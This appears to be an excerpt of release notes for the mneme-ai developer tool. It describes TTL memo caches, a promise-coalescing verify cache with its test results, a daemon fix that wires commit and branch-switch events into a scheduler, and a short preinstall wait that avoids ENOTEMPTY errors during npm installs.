1. **`buildAllTools()` memo** ([packages/mcp/src/tools/_registry.ts:130](packages/mcp/src/tools/_registry.ts#L130)) — 30s TTL module-level memo. Returns a defensive copy so callers can sort/mutate without poisoning the cache. Frozen snapshot prevents accidental mutation through stale references.

2. **`countMnemeTools()` memo** ([packages/core/src/squadron/fact_grounding.ts:278](packages/core/src/squadron/fact_grounding.ts#L278)) — 30s TTL keyed on repoRoot. Filesystem walk only fires once per 30s instead of once per verify.

3. **`buildLiveCatalog()` memo** ([packages/mcp/src/tools/_v1915_truth_forensic.ts:18](packages/mcp/src/tools/_v1915_truth_forensic.ts#L18)) — 30s TTL cached `.map(t => t.name)` output. Frozen snapshot.

**WILD IDEA — concurrency-coalescing VERIFY CACHE** ([packages/core/src/verify_cache/index.ts](packages/core/src/verify_cache/index.ts)):

A tiny generic module no LangChain / Helicone / Portkey / Vellum / Braintrust composes:

- `withVerifyCache(key, compute)` returns cached value within TTL.
- If a compute is **already in-flight** for the same key, all subsequent callers `await` the same Promise — **50 parallel identical claims = 1 actual compute + 49 promise-shared awaiters**.
- Failure propagation: compute throws → in-flight cleared (no permanent poison) → ALL coalesced awaiters see the same error simultaneously.
- Bounded: MAX_MEMO_ENTRIES=1000 with oldest-first eviction on growth.
- Generic: any `() => Promise<T>` can be wrapped. Other hot paths (capabilities, intent, honesty) can adopt the same hook later.

Wired into `truth.forensic` + `truth.explain` handlers with a shared cache key shape so a prior forensic call answers an explain call for the same claim instantly.

**Provably measured** ([packages/mcp/src/tools/_v1915_truth_forensic_p1.test.ts](packages/mcp/src/tools/_v1915_truth_forensic_p1.test.ts)):
- 50 parallel identical claims: `totalMisses=1, totalCoalesced=49` (test asserts it)
- 50 parallel DIFFERENT claims: `totalMisses=50, totalCoalesced=0` (no false coalescing)
- 4 sequential identical claims: `totalMisses=1, totalHits=3` (TTL hit)

### 🌙 P3 DREAMSPACE WAKEUP — daemon event-signal wiring

**Root cause**: scheduler at [packages/core/src/autonomic_scheduler/index.ts:258-285](packages/core/src/autonomic_scheduler/index.ts#L258) checks `events.hasCommitCycle`, `events.hasBranchSwitch`, `events.msSinceLastCommit` for DREAMSPACE + SLEEP context-shift triggers. Daemon at [packages/cli/src/commands/daemon.ts:160-164](packages/cli/src/commands/daemon.ts#L160) only supplied `hasGitEvent` / `hasFileSaveEvent` / `idleMs` — the 3 context-shift fields were always `undefined`. Result: dreamspace's `fireOnContextShift: true` never matched → organ permanently dormant for active devs → user's report.

**Fix**: daemon now tracks `lastCommitDetectedAtMs` + `lastBranchSwitchAtMs` + `lastSeenBranchRef` and populates ALL THREE missing fields on every tick cycle:

- `hasCommitCycle = lastCommitDetectedAtMs > 0 && (now - lastCommitDetectedAtMs) < 90s` — fires DREAMSPACE on next tick
- `hasBranchSwitch = lastBranchSwitchAtMs > 0 && (now - lastBranchSwitchAtMs) < 90s` — fires SLEEP on next tick
- `msSinceLastCommit = now - lastCommitDetectedAtMs` — covers the "long no-commit gap" path (60min dreamspace / 30min sleep)

Branch ref reading on daemon boot + after every `triggerReindex()` (.git/HEAD parsed for `ref: refs/heads/X` form). The 6h dead-man's switch remains as the safety net.

Tests ([packages/core/src/autonomic_scheduler/dreamspace_p3.test.ts](packages/core/src/autonomic_scheduler/dreamspace_p3.test.ts)): 6/6 pass:
- DREAMSPACE fires on `hasCommitCycle=true`
- SLEEP fires on `hasBranchSwitch=true`
- DREAMSPACE fires after 60min no-commit gap
- Regression guard: empty events keep dreamspace dormant (the OLD bug shape)
- Dead-man still fires at 6h regardless of context-shift
- Config invariants (fireOnContextShift + dead-man both set)

### 📦 P2 PREINSTALL WAIT — 1.5s OS handle-release after daemon stop

**Background**: user reported `npm install -g mneme-ai@2.19.49` hit `ENOTEMPTY zod/src` and `ENOTEMPTY mneme-ai/` on repeated install attempts. v2.19.45's daemon-stop preinstall closes the libvips lock but `spawnSync` returns when the process exits — the OS still needs ~100-300ms to release file watchers (especially Node fs.watch handles on zod/sharp).

CPU spike is brief and only during install; ENOTEMPTY race is real and recurring.

Still zero file refs to package internals — chicken-and-egg safe per v2.19.50 (which added the ritual phase 3.6 that would catch any regression here).
